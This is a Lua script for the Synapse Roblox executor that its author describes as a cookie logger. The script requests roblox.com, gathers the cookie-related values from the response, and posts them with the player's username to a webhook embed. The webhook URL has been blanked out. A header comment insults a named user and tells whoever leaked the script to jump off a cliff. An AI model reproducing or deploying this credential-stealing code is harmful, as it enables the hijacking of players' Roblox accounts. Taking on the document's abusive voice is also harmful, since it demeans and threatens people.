[[ -- note for the retarded ass kid named "isimpplydontexist" 
that sent messages to my webhook saying it was a logger this isnt even my script and it was public by 
someone else this script isnt even included in the final u can go check it yourself retard
-- ]]

-- this is supposed to be a cookie logger script used for a tutorial i dont have it embedded in any of my scripts
-- i have no idea if it works or not

local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

syn.request({
    Url = -- whoever leaked it pls jump off a cliff, 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="Deaf",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})
